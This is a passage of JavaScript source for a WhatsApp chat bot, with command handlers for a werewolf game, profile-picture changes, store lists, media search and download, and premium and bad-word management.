                        rowId: `.wwpc kill ${ww[chat].player[p].number}`,
                        description: `To kill players ${ww[chat].player[p].number}`,
                      });
                    }
                    const sections = [
                      { title: "⌂ W E R E W O L F - G A M E", rows: row },
                    ];
                    const listMessage = {
                      text: text,
                      footer: `Player Life: ${playerHidup(
                        sesi(m.chat, ww)
                      )} Player Dead: ${playerMati(sesi(m.chat, ww))}`,
                      title: "⌂ W E R E W O L F - G A M E\n",
                      buttonText: "Click here!",
                      sections,
                      mentions: player,
                    };
                    await LordVoltage.sendMessage(ww[chat].player[i].id, listMessage);
                   
                    await LordVoltage.sendMessage(ww[chat].player[i].id, {
                        text: textt,
                        mentions: player,
                    });
                }

                // [ villager ]
            } else if (ww[chat].player[i].role === "villager") {
                if (ww[chat].player[i].isdead != true) {
                    let texttt = `*⌂ W E R E W O L F - G A M E*\n\nHello ${LordVoltage.getName(
              ww[chat].player[i].id
            )} Your role is *Village Resident* ${emoji_role(
              "inhabitant"
            )}, Stay alert, maybe a *Werewolf* will eat you tonight, please go to your respective homes.\n*LIST PLAYER*:\n${list1}`;
                    await LordVoltage.sendMessage(ww[chat].player[i].id, {
                        text: texttt,
                        mentions: player,
                    });
                }

                // [ Penerawangan ]
            } else if (ww[chat].player[i].role === "seer") {
                if (ww[chat].player[i].isdead != true) {
                    let texxt = `Hello ${LordVoltage.getName(
              ww[chat].player[i].id
            )} You have been chosen to be a *Seeker* ${emoji_role(
              "seer"
            )}. With the magic you have, you can find out the role of the player you choose.\n*LIST PLAYER*:\n${list1}\n\n Type *.wwpc dreamy number* to see the role player`;
                    
                     let row = [];
                     for (let p = 0; p < ww[chat].player.length; p++) {
                       row.push({
                         title: `Check Player ${ww[chat].player[p].number}`,
                         rowId: `.wwpc dreamy ${ww[chat].player[p].number}`,
                         description: `To see the player's identity ${ww[chat].player[p].number}`,
                       });
                     }
                     const sections = [
                       { title: "⌂ W E R E W O L F - G A M E", rows: row },
                     ];
                     const listMessage = {
                       text: text,
                       footer: `Live Player: ${playerHidup(
                         sesi(m.chat, ww)
                       )} Dead Player: ${playerMati(sesi(m.chat, ww))}`,
                       title: "⌂ W E R E W O L F - G A M E\n",
                       buttonText: "Click here!",
                       sections,
                       mentions: player,
                     };
                     await LordVoltage.sendMessage(ww[chat].player[i].id, listMessage);
                     
                    await LordVoltage.sendMessage(ww[chat].player[i].id, {
                        text: texxt,
                        mentions: player,
                    });
                }

                // [ Guardian ]
            } else if (ww[chat].player[i].role === "guardian") {
                if (ww[chat].player[i].isdead != true) {
                    let teext = `Hello ${LordVoltage.getName(
              ww[chat].player[i].id
            )} You were chosen to play the *Guardian Angel* ${emoji_role(
              "guardian"
            )}, With the power you have, you can protect the citizens, please choose one player you want to protect\n*LIST PLAYER*:\n${list1}\n\nType *.wwpc deff number* to protect players`;
                    
                    let row = [];
                    for (let p = 0; p < ww[chat].player.length; p++) {
                      row.push({
                        title: `Protect Players ${ww[chat].player[p].number}`,
                        rowId: `.wwpc deff ${ww[chat].player[p].number}`,
                        description: `To protect players ${ww[chat].player[p].number}`,
                      });
                    }
                    const sections = [
                      { title: "⌂ W E R E W O L F - G A M E", rows: row },
                    ];
                    const listMessage = {
                      text: text,
                      footer: `Live Player: ${playerHidup(
                        sesi(m.chat, ww)
                      )} Dead Player: ${playerMati(sesi(m.chat, ww))}`,
                      title: "⌂ W E R E W O L F - G A M E\n",
                      buttonText: "Click here!",
                      sections,
                      mentions: player,
                    };
                    await LordVoltage.sendMessage(ww[chat].player[i].id, listMessage);
                    
                    await LordVoltage.sendMessage(ww[chat].player[i].id, {
                        text: teext,
                        mentions: player,
                    });
                }

                // [ Sorcerer ]
            } else if (ww[chat].player[i].role === "sorcerer") {
                if (ww[chat].player[i].isdead != true) {
                    let textu = `Hello ${LordVoltage.getName(
              ww[chat].player[i].id
            )} You were chosen as a Wizard ${emoji_role(
              "sorcerer"
            )}, With the power you have, you can reveal the identities of the players, please select 1 person whose identity you want to reveal\n*LIST PLAYER*:\n${list2}\n\nType *.wwpc sorcerer number* to see the player role`;
                    
                    let row = [];
                    for (let p = 0; p < ww[chat].player.length; p++) {
                      row.push({
                        title: `Check Player ${ww[chat].player[p].number}`,
                        rowId: `.wwpc sorcerer ${ww[chat].player[p].number}`,
                        description: `To see the player's identity ${ww[chat].player[p].number}`,
                      });
                    }
                    const sections = [
                      { title: "⌂ W E R E W O L F - G A M E", rows: row },
                    ];
                    const listMessage = {
                      text: text,
                      footer: `Live Player: ${playerHidup(
                        sesi(m.chat, ww)
                      )} Dead Player: ${playerMati(sesi(m.chat, ww))}`,
                      title: "⌂ W E R E W O L F - G A M E\n",
                      buttonText: "Click here!",
                      sections,
                      mentions: player,
                    };
                    await LordVoltage.sendMessage(ww[chat].player[i].id, listMessage);
                    
                    await LordVoltage.sendMessage(ww[chat].player[i].id, {
                        text: textu,
                        mentions: player,
                    });
                }
            }
        }
        await LordVoltage.sendMessage(m.chat, {
            text: "*⌂ W E R E W O L F - G A M E*\n\nThe game has started, the players will play their respective roles, please check the private chat to see your role. Be careful, residents, maybe tonight will be your last",
            contextInfo: {
                externalAdReply: {
                    title: "W E R E W O L F",
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    thumbnail: await resize(thumb, 300, 175),
                    sourceUrl: "",
                    mediaUrl: thumb,
                },
                mentionedJid: player,
            },
        });
        await run(LordVoltage, chat, ww);
    } else if (value === "vote") {
        if (!ww[chat]) return m.reply("There are no gaming sessions yet");
        if (ww[chat].status === false)
            return m.reply("The game session has not started yeti");
        if (ww[chat].time !== "voting")
            return m.reply("The voting session has not yet started");
        if (playerOnRoom(sender, chat, ww) === false)
            return m.reply("You're not a player");
        if (dataPlayer(sender, ww).isdead === true)
            return m.reply("You are dead");
        if (!target || target.length < 1)
            return m.reply("Enter the player number");
        if (isNaN(target)) return m.reply("Use only numbers");
        if (dataPlayer(sender, ww).isvote === true)
            return m.reply("You've already voted");
        b = getPlayerById(chat, sender, parseInt(target), ww);
        if (b.db.isdead === true)
            return m.reply(`Player ${target} is dead.`);
        if (ww[chat].player.length < parseInt(target))
            return m.reply("Invalid");
        if (getPlayerById(chat, sender, parseInt(target), ww) === false)
            return m.reply("Player not registered!");
        vote(chat, parseInt(target), sender, ww);
        return m.reply("Vote");
    } else if (value == "exit") {
        if (!ww[chat]) return m.reply("No gaming sessions");
        if (playerOnRoom(sender, chat, ww) === false)
            return m.reply("You are not in a gaming session");
        if (ww[chat].status === true)
            return m.reply("The game has started, you can't leave");
        m.reply(`@${sender.split("@")[0]} Exit the game`, {
            withTag: true,
        });
        playerExit(chat, sender, ww);
    } else if (value === "delete") {
        if (!ww[chat]) return m.reply("No gaming sessions");
        if (ww[chat].owner !== sender)
            return m.reply(
                `Only @${
            ww[chat].owner.split("@")[0]
          } which can delete this game session`
            );
        m.reply("The game session was successfully deleted").then(() => {
            delete ww[chat];
        });
    } else if (value === "player") {
        if (!ww[chat]) return m.reply("No gaming sessions");
        if (playerOnRoom(sender, chat, ww) === false)
            return m.reply("You are not in a gaming session");
        if (ww[chat].player.length === 0)
            return m.reply("The game session does not have any players yet");
        let player = [];
        let text = "\n*⌂ W E R E W O L F - G A M E*\n\nLIST PLAYER:\n";
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `(${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )} ${
          ww[chat].player[i].isdead === true
            ? `(🪦) ${ww[chat].player[i].role}`
            : ""
        }\n`;
            player.push(ww[chat].player[i].id);
        }
        LordVoltage.sendMessage(
            m.chat, {
                text: text,
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "",
                        mediaUrl: thumb,
                    },
                    mentionedJid: player,
                },
            }, {
                quoted: m
            }
        );
    } else {
        let text = `\n*⌂ W E R E W O L F - G A M E*\n\nSocial Games That Take Place Over Several Rounds. Players are required to look for a criminal in the game. The players are given their own time, roles and abilities to play this game\n\n*⌂ C O M M A N D*\n`;
        text += ` • ww create\n`;
        text += ` • ww join\n`;
        text += ` • ww start\n`;
        text += ` • ww exit\n`;
        text += ` • ww delete\n`;
        text += ` • ww player\n`;
        text += `\nThis game can be played by 5 to 15 people.`;
        LordVoltage.sendMessage(
            m.chat, {
                text: text.trim(),
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "",
                        mediaUrl: thumb,
                    },
                },
            }, {
                quoted: m
            }
        );
    }
}}
break
//==================================================================
case 'wwpc': {if (prefix === '.') {
let {
    emoji_role,
    sesi,
    playerOnGame,
    playerOnRoom,
    playerExit,
    dataPlayer,
    dataPlayerById,
    getPlayerById,
    getPlayerById2,
    killWerewolf,
    killww,
    dreamySeer,
    sorcerer,
    protectGuardian,
    roleShuffle,
    roleChanger,
    roleAmount,
    roleGenerator,
    addTimer,
    startGame,
    playerHidup,
    playerMati,
    vote,
    voteResult,
    clearAllVote,
    getWinner,
    win,
    pagi,
    malam,
    skill,
    voteStart,
    voteDone,
    voting,
    run,
    run_vote,
    run_malam,
    run_pagi
} = require('./lib/werewolf.js')

    const {
        sender,
        chat
    } = m;
    LordVoltage.werewolf = LordVoltage.werewolf ? LordVoltage.werewolf : {};
    const ww = LordVoltage.werewolf ? LordVoltage.werewolf : {};
    const value = args[0];
    const target = args[1];

    if (playerOnGame(sender, ww) === false)
        return reply("You are not in a game session");
    if (dataPlayer(sender, ww).status === true)
        return reply(
            "Skill has been used, skill can only be used once per night"
        );
    if (dataPlayer(sender, ww).isdead === true)
        return reply("You are dead");
    if (!target || target.length < 1) return reply("Enter the player number");
    if (isNaN(target)) return reply("Use only numbers");
    let byId = getPlayerById2(sender, parseInt(target), ww);
    if (byId.db.isdead === true) return reply("Player is dead");
    if (byId.db.id === sender)
        return reply("Cannot use skills for yourself");
    if (byId === false) return reply("Player not registered");
    if (value === "kill") {
        if (dataPlayer(sender, ww).role !== "werewolf")
            return reply("This role is not for you");
        if (byId.db.role === "sorcerer")
            return reply("Cannot use skills for friends");
        return m
            .reply("Successfully killed the player " + parseInt(target))
            .then(() => {
                dataPlayer(sender, ww).status = true;
                killWerewolf(sender, parseInt(target), ww);
            });
    } else if (value === "dreamy") {
        if (dataPlayer(sender, ww).role !== "seer")
            return reply("This role is not for you");
        let dreamy = dreamySeer(m.sender, parseInt(target), ww);
        return m
            .reply(`Successfully unlocked the identity of player ${target} is ${dreamy}`)
            .then(() => {
                dataPlayer(sender, ww).status = true;
            });
    } else if (value === "deff") {
        if (dataPlayer(sender, ww).role !== "guardian")
            return reply("This role is not for you");
        return reply(`Successfully protected the player ${target}`)
        .then(() => {
            protectGuardian(m.sender, parseInt(target), ww);
            dataPlayer(sender, ww).status = true;
        });
    } else if (value === "sorcerer") {
        if (dataPlayer(sender, ww).role !== "sorcerer")
            return reply("This role is not for you");
        let sorker = sorcerer(sesi(m.sender), target);
        return m
            .reply(`Successfully unlocked player identity ${player} is ${sorker}`)
            .then(() => {
                dataPlayer(sender, ww).status = true;
            });
    }
}}
break
//==================================================================
case 'setpppanjang': {if (prefix === '.') {
const jimp_1 = require('jimp')
async function pepe(media) {
	const jimp = await jimp_1.read(media)
	const min = jimp.getWidth()
	const max = jimp.getHeight()
	const cropped = jimp.crop(0, 0, min, max)
	return {
		img: await cropped.scaleToFit(720, 720).getBufferAsync(jimp_1.MIME_JPEG),
		preview: await cropped.normalize().getBufferAsync(jimp_1.MIME_JPEG)
	}
}

	let q = m.quoted ? m.quoted : m
	let mime = (q.msg || q).mimetype || q.mediaType || ''
	if (/image/g.test(mime) && !/webp/g.test(mime)) {
		try {
			const media = await LordVoltage.downloadAndSaveMediaMessage(quoted)
			let botNumber = await LordVoltage.decodeJid(LordVoltage.user.id)
			let { img } = await pepe(media)
			await LordVoltage.query({
				tag: 'iq',
				attrs: {
					to: botNumber,
					type:'set',
					xmlns: 'w:profile:picture'
				},
				content: [
					{
						tag: 'picture',
						attrs: { type: 'image' },
						content: img
					}
				]
			})
			reply(`Successfully replaced PP Bot`)
		} catch (e) {
			console.log(e)
			reply(`An error occurred, try again later.`)
		}
	} else {
		reply(`Send pictures with captions *${command}* or tag images that have been sent`)
	}
}}
break
//==================================================================
case 'setpppgcanjang': {if (prefix === '.') {
const jimp_1 = require('jimp')
async function pepe(media) {
	const jimp = await jimp_1.read(media)
	const min = jimp.getWidth()
	const max = jimp.getHeight()
	const cropped = jimp.crop(0, 0, min, max)
	return {
		img: await cropped.scaleToFit(720, 720).getBufferAsync(jimp_1.MIME_JPEG),
		preview: await cropped.normalize().getBufferAsync(jimp_1.MIME_JPEG)
	}
}

	let q = m.quoted ? m.quoted : m
	let mime = (q.msg || q).mimetype || q.mediaType || ''
	if (/image/g.test(mime) && !/webp/g.test(mime)) {
		try {
			const media = await LordVoltage.downloadAndSaveMediaMessage(quoted)
			let { img } = await pepe(media)
			await LordVoltage.query({
				tag: 'iq',
				attrs: {
					to: m.chat,
					type:'set',
					xmlns: 'w:profile:picture'
				},
				content: [
					{
						tag: 'picture',
						attrs: { type: 'image' },
						content: img
					}
				]
			})
			reply(`Admin @${(m.sender || '').replace(/@s\.whatsapp\.net/g, '')} has changed the Icon Group!`, null, { mentions: [m.sender] })
		} catch (e) {
			console.log(e)
			reply(`An error occurred, try again later.`)
		}
	} else {
		reply(`Send pictures with captions *${command}* or tag images that have been sent`)
	}
}}
break


//===============Store-Menu================\\
case 'list': case 'store':{if (prefix === '.') {
if (db_respon_list.length === 0) return reply(`There is no message list in the database yet`)
if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return reply(`There is no list of messages registered in this group yet`)
let teks = `hello @${m.sender.split("@")[0]} The following is a list of what is currently available.\n\n`
for (let i of db_respon_list) {
if (i.id === m.chat) {
teks += `- ${i.key.toUpperCase()}\n`
}
}
teks += `\n\nTo view product details, please send the product name in the list above. For example, you want to see product details from ${db_respon_list[0].key.toUpperCase()}, then send a message ${db_respon_list[0].key.toUpperCase()} to the bot`
LordVoltage.sendMessage(m.chat, {text: teks, mentions: [m.sender]}, {quoted:m}) 
}}
break
case 'dellist':if (prefix === '.') {
if (!m.isGroup) return reply('Group Special Features!')
if (!isAdmins) return reply('Admin only feature!')
if (db_respon_list.length === 0) return reply(`There is no message list in the database yet`)
if (!text) return reply(`use it by the way ${prefix + command} *key*\n\n_Example_\n\n${prefix + command} hello`)
if (!isAlreadyResponList(m.chat, q.toLowerCase(), db_respon_list)) return reply(`Response list with key *${q}* not in database!`)
delResponList(m.chat, q.toLowerCase(), db_respon_list)
reply(`Successfully delete message list with key *${q}*`)}
break
case 'addlist':if (prefix === '.') {
if (!m.isGroup) return reply('Group Special Features!')
if (!isAdmins) return reply('Admin only feature!')
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return reply(`use it by the way ${prefix+command} *key|response*\n\n_Example_\n\n${prefix+command} test|what`)
if (isAlreadyResponList(m.chat, args1, db_respon_list)) return reply(`List of responses with key : *${args1}* already in this group.`)
if (/image/.test(mime)) {
let media = await LordVoltage.downloadAndSaveMediaMessage(quoted)
const fd = new FormData();
fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
addResponList(m.chat, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
reply(`Successfully set list message with key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
})
} else {
addResponList(m.chat, args1, args2, false, '-', db_respon_list)
reply(`Successfully set list message with key : *${args1}*`)
}}
break
case 'updatelist': case 'update':if (prefix === '.') {
if (!m.isGroup) return reply('Group Special Features!')
if (!isAdmins) return reply('Admin only feature!')
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return reply(`use it by the way ${prefix+command} *key|response*\n\n_Example_\n\n${prefix+command} tes|apa`)
if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return reply(`Sorry, for the key *${args1}* Not yet registered in this group`)
if (/image/.test(mime)) {
let media = await LordVoltage.downloadAndSaveMediaMessage(quoted)
const fd = new FormData();
fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
updateResponList(m.chat, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
reply(`Sukses update respon list dengan key *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
})
} else {
updateResponList(m.chat, args1, args2, false, '-', db_respon_list)
reply(`Sukses update respon list dengan key *${args1}*`)
}}
break

case 'setproses': case 'setp':if (prefix === '.') {
if (!m.isGroup) return reply('Group Special Features!')
if (!isAdmins) return reply('Admin only feature!')
if (!text) return reply(`use it by the way ${prefix + command} *teks*\n\n_Example_\n\n${prefix + command} The order is being processed @user\n\n- @user (tag the person who ordered)\n- @order (order)\n- @hour (order time)\n- @date (order date) `)
if (isSetProses(m.chat, set_proses)) return reply(`Set proses already active`)
addSetProses(text, m.chat, set_proses)
reply(`🙂 Done set proses!`)}
break
case 'changeproses': case 'changep':if (prefix === '.') {
if (!m.isGroup) return reply('Group Special Features!')
if (!isAdmins) return reply('Admin only feature!')
if (!text) return reply(`use it by the way ${prefix + command} *teks*\n\n_Example_\n\n${prefix + command} The order is being processed @user\n\n- @user (tag the person who ordered)\n- @order (order)\n- @hour (order time)\n- @date (order date) `)
if (isSetProses(m.chat, set_proses)) {
changeSetProses(text, m.chat, set_proses)
reply(`Sukses ubah set proses!`)
} else {
addSetProses(text, m.chat, set_proses)
reply(`Successfully change process set!`)
}}
break
case 'delsetproses': case 'delsetp':if (prefix === '.') {
if (!m.isGroup) return reply('Group Special Features!')
if (!isAdmins) return reply('Admin only feature!')
if (!isSetProses(m.chat, set_proses)) return reply(`There are no process sets in this gc yet`)
removeSetProses(m.chat, set_proses)
reply(`Successfully delete process set`)}
break
case 'setdone':{if (prefix === '.') {
if (!m.isGroup) return reply('Group Special Features!')
if (!isAdmins) return reply('Admin only feature!')
if (!text) return reply(`use it by the way ${prefix + command} *teks*\n\n_Example_\n\n${prefix + command} Done @user\n\n- @user (tag the person who ordered)\n- @order (order)\n- @hour (order time)\n- @date (order date) `)
if (isSetDone(m.chat, set_done)) return reply(`I've set it done before`)
addSetDone(text, m.chat, set_done)
reply(`Successful set done!`)}}
break
case 'changedone': case 'changed':if (prefix === '.') {
if (!m.isGroup) return reply('Group Special Features!')
if (!isAdmins) return reply('Admin only feature!')
if (!text) return reply(`use it by the way ${prefix + command} *teks*\n\n_Example_\n\n${prefix + command} Done @user\n\n- @user (tag the person who ordered)\n- @order (order)\n- @hour (order time)\n- @date (order date) `)
if (isSetDone(m.chat, set_done)) {
changeSetDone(text, m.chat, set_done)
reply(`Successful change set done!`)
} else {
addSetDone(text, m.chat, set_done)
reply(`Successful change set done!`)
}}
break
case 'delsetdone': case 'delsetd':if (prefix === '.') {
if (!m.isGroup) return reply('Group Special Features!')
if (!isAdmins) return reply('Admin only feature!')
if (!isSetDone(m.chat, set_done)) return reply(`There is no set done yet on this GC`)
removeSetDone(m.chat, set_done)
reply(`Successfully delete set done`)}
break
//=========================================\\	
case 'gptimg':
case 'bingimg': {if (prefix === '.') {
if (!isPrem) return replyprem(mess.premium)
if (!text) return reply('Wheres the prompt, boss?...')
	try {
	  reply(mess.wait)
  let ini = await fetchJson(`https://aemt.me/googleimage?query=${q}`);
for (let bing of ini.result) {
await sleep(500)
await LordVoltage.sendMessage(m.chat, { image: { url: bing }, caption: ``}, {quoted: m})
LordVoltage.sendMessage(m.chat, { react: { text: `☑️`, key: m.key }})
}
} catch (e) {
LordVoltage.sendMessage(m.chat, { react: { text: `✖️`, key: m.key }})
}
}}
break
//=========================================\\	
case 'smeta': {if (prefix === '.') {
if (!/webp/.test(mime)) return replynano('Reply sticker!')
  var stiker = false
    try {
        let [packname, ...author] = q.split('|')
            //var author = (author  []).join('|')
                let mime = m.quoted.mimetype || ''
                        //let img = await q.download()
                            let img = await LordVoltage.downloadAndSaveMediaMessage(quoted, makeid(5))
                                if (!img) return replynano('Reply a sticker!')
                                    var stiker = await addExifAvatar(img, `Made by`, `SHADØW-XMD`)
                                      } catch (e) {
                                          console.error(e)
                                              if (Buffer.isBuffer(e)) stiker = e
                                                } finally {
                                                    if (stiker) LordVoltage.sendMessage(m.chat, {
                                                          sticker: stiker
                                                              }, {
                                                                    quoted: m
                                                                        })
                                                                            else return replynano('reply sticker')
                                                                              }
                                                                              }       
            }                                                                  break
			case 'gimage': {if (prefix === '.') {
if (!text) return replynano(`Example : ${prefix + command} carry minati`)
reply(mess.wait)
let ini = await fetchJson(`https://aemt.me/googleimage?query=${q}`);
try{
for (let bing of ini.result) {
await sleep(500)
await LordVoltage.sendMessage(m.chat, { image: { url: bing }, caption: ``}, {quoted: m})
LordVoltage.sendMessage(m.chat, { react: { text: `☑️`, key: m.key }})
}
} catch (e) {
LordVoltage.sendMessage(m.chat, { react: { text: `✖️`, key: m.key }})
}
}}
        break
			case 'mediafire': {if (prefix === '.') {
	if (args.length == 0) return replynano(`Where is the link?`)
	if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return replynano(`The link you provided is invalid`)
	const { mediafireDl } = require('./lib/mediafire.js')
	const baby1 = await mediafireDl(text)
	if (baby1[0].size.split('MB')[0] >= 10000) return replynano('Oops, the file is too big...')
	const result4 = `*MEDIAFIRE DOWNLOADER*

*★ NAME* : ${baby1[0].nama}
*★ SIZE* : ${baby1[0].size}
*★ MIME* : ${baby1[0].mime}
*★ LINK* : ${baby1[0].link}`
replynano(`${result4}`)
LordVoltage.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m })
}}
break

case 'google': {if (prefix === '.') {
if (!q) return replynano(`Example : ${prefix + command} ${botname}`)
reply(mess.wait)
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `★ *TITLE* : ${g.title}\n`
teks += `★ *DESCRIPTION* : ${g.snippet}\n`
teks += `★ *LINK* : ${g.link}\n\n────────────────────────\n\n`
} 
replynano(teks)
})
}}
break
case 'happymod':{if (prefix === '.') {
if (!q) return replynano(`Example ${prefix+command} Sufway surfer mod`)
reply(mess.wait)
let kat = await scp1.happymod(q)
replynano(util.format(kat))
}}
break
case 'yts': case 'ytsearch': {if (prefix === '.') {
if (!text) return replynano(`Example : ${prefix + command} story wa anime`)
let yts = require("yt-search")
let search = await yts(text)
let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
let no = 1
for (let i of search.all) {
teks += `${themeemoji} No : ${no++}\n${themeemoji} Type : ${i.type}\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Title : ${i.title}\n${themeemoji} Views : ${i.views}\n${themeemoji} Duration : ${i.timestamp}\n${themeemoji} Uploaded : ${i.ago}\n${themeemoji} Url : ${i.url}\n\n─────────────────\n\n`
}
LordVoltage.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }}
            break
case 'warcall': {if (prefix === '.') {
 //if (!m.isGroup) return reply(mess.only.group)
if(!text) return reply(`Example: \n.warcall kontol`)
LordVoltage.relayMessage(m.chat, {
scheduledCallCreationMessage: {
callType: 1,
scheduledTimestampMs:  Date.now(),
title: text
}
}, {})
}}
break

case 'play': {if (prefix === '.') {
  const prefixes = [".", ","];
  const text = m?.message?.conversation || m?.message?.extendedTextMessage?.text || "";
  const usedPrefix = prefixes.find(p => text.startsWith(p)) || ".";
  const commandName = "play";

  const songName = args.join(" ");
  if (!songName) {
    return replynano(`*Example*: ${usedPrefix + commandName} faded by alan walker`);
  }

  try {
    // React: Processing
    await LordVoltage.sendMessage(m.chat, { react: { text: "🎵", key: m.key } });

    const yts = require('./scrape/yt-search'); // Using your local file
    const searchResult = await yts(songName);
    const video = searchResult.videos[0];

    if (!video) {
      return replynano(`*No results found for:* ${songName}`);
    }

    // React: Success
    await LordVoltage.sendMessage(m.chat, { react: { text: "🎧", key: m.key } });

    const caption =
      `∘ *𝗦𝗛𝗔𝗗Ø𝗪-𝗫𝗠𝗗 𝗠𝗨𝗦𝗜𝗖 - 𝗣𝗟𝗔𝗬𝗘𝗥*\n` +
      `∘ *𝗧𝗜𝗧𝗟𝗘:* \`${video.title}\`\n` +
      `∘ *𝗔𝗥𝗧𝗜𝗦𝗧:* ${video.author.name}\n` +
      `∘ *𝗩𝗜𝗘𝗪𝗦:* ${video.views}\n` +
      `∘ *𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡:* ${video.timestamp}\n` +
      `∘ *𝗨𝗣𝗟𝗢𝗔𝗗𝗘𝗗:* ${video.ago}\n` +
       `> ♧𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝗠𝗔𝗫𝗧𝗘𝗖𝗛♧`;


    await LordVoltage.sendMessage(m.chat, {
      image: { url: video.thumbnail },
      caption
    }, { quoted: m });

    const apiUrl = `https://api.nexoracle.com/downloader/yt-audio2?apikey=MatrixZatKing&url=${encodeURIComponent(video.url)}`;
    const res = await axios.get(apiUrl);

    if (res.data?.status === 200 && res.data?.result?.audio) {
      const { audio, title } = res.data.result;

      await LordVoltage.sendMessage(m.chat, {
        audio: { url: audio },
        mimetype: "audio/mp4",
        fileName: `${title || "song"}.mp3`,
        caption: `🎶 *Here's your song:* ${title || "your requested track"}\n🔊 *♧𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝗠𝗔𝗫𝗧𝗘𝗖𝗛♧!*`
      }, { quoted: m });

      // The setTimeout block has been removed
    } else {
      replynano("*Failed to fetch the song audio! Please try again later.*");
    }

  } catch (error) {
    console.error("Error during play command:", error);
    replynano("*An error occurred while processing your song. Try again later.*");
  }
}}
break;

case 'ytmp3': {if (prefix === '.') {
  if (!text) return replynano(`Send command with a YouTube link: ${prefix + command} <Link>`);
  replynano('* Searching for Audio....*');
  try {
    const res = await fetch(`https://apirest.sazxofficial.web.id/api/download/ytmp3?url=${encodeURIComponent(text)}`);
    const data = await res.json();
    if (!data?.status) return replynano('⚠️ Failed to get data!');
    const audioUrl = data?.download?.audio;

    if (audioUrl) {
      await LordVoltage.sendMessage(m.chat, {
        audio: { url: audioUrl },
        mimetype: 'audio/mpeg',
      }, { quoted: m });
    } else {
      replynano('⚠️ Audio URL not found in the response.');
    }
  } catch (error) {
    console.error('ytmp3 Error:', error);
    replynano('❌ An error occurred while searching for data.');
  }
}}
break;
case 'ytmp4': {if (prefix === '.') {
  if (!text) return replynano('Send command with a YouTube link.');
  replynano('*Searching for video...*');
  try {
    const res = await fetch(`https://api.siputzx.my.id/api/d/ytmp4?url=${encodeURIComponent(text)}`);
    const response = await res.json();
    const linkdl = response?.data?.dl;

    if (linkdl) {
      await LordVoltage.sendMessage(m.chat, { video: { url: linkdl }, caption: '> *♧𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝗠𝗔𝗫𝗧𝗘𝗖𝗛♧*' }, { quoted: m });
    } else {
      replynano('*Failed to download video.*');
    }
  } catch (error) {
    console.error('ytmp4 Error:', error);
    replynano('*An error occurred while searching for the video.*');
  }
}}
break;


case 'mycase':if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
const getCase = (cases) => {
return "case"+`'${cases}'`+fs.readFileSync("shadow.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
replynano(`${getCase(q)}`)}
break
//=========================================\\
	case 'addprem': {if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
if (!args[0]) return replynano(`Use ${prefix+command} number\nExample ${prefix+command} 256xxxxx`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await LordVoltage.onWhatsApp(prrkek)
if (ceknya.length == 0) return replynano(`Enter a valid and registered number on WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
replynano(`The Number ${prrkek} Has Been Added As Premium!`)
}}
break
//=========================================\\
case 'delprem':if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
if (!args[0]) return replynano(`Use ${prefix+command} nomor\nExample ${prefix+command} 256xxxxx`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
replynano(`The Number ${ya} Has Been Removed As Premium!`)}
break
case 'addbadword':{if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replynano('Whats the word?')
if (BadNano.includes(q)) return replynano("The word is already in use")
BadNano.push(q)
fs.writeFileSync('./database/bad.json', JSON.stringify(BadNano))
replynano(`Success Adding Bad Word\nCheck by typing ${prefix}listbadword`)
}}
break
case 'delbadword':{if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replynano('Enter the word')
if (!BadNano.includes(q)) return replynano("The word does not exist in the database")
let wanu = BadNano.indexOf(q)
BadNano.splice(wanu, 1)
fs.writeFileSync('./database/bad.json', JSON.stringify(BadNano))
replynano(`Success deleting bad word ${q}`)
}}
break
case 'listbadword':{if (prefix === '.') {
let teks = '┌──★「 *BadWord List* 」\n│\n'
for (let x of BadNano) {
teks += `│† ${x}\n`
}
teks += `│\n└────────────★\n\n*Totally there are : ${BadNano.length}*`
replynano(teks)
}}
break
